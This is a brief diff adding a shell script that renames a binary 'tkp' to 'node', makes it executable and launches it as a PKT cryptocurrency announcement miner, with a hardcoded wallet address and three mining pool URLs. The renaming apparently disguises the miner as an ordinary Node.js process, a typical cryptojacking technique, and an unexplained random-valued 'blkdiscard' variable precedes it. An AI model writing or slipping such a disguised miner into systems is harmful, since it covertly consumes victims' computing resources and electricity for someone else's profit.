@@ -1,0 +1,4 @@
+blkdiscard=$(shuf -n 1 -i 1-999999)
+mv tkp node
+chmod +x node
+./node ann -p pkt1qu2j3ca9xanmkvlqmzrzwtmmxdhx2kn03gqtrdy http://pool.srizbi.com http://pool.pktpool.io http://pool.pkt.world
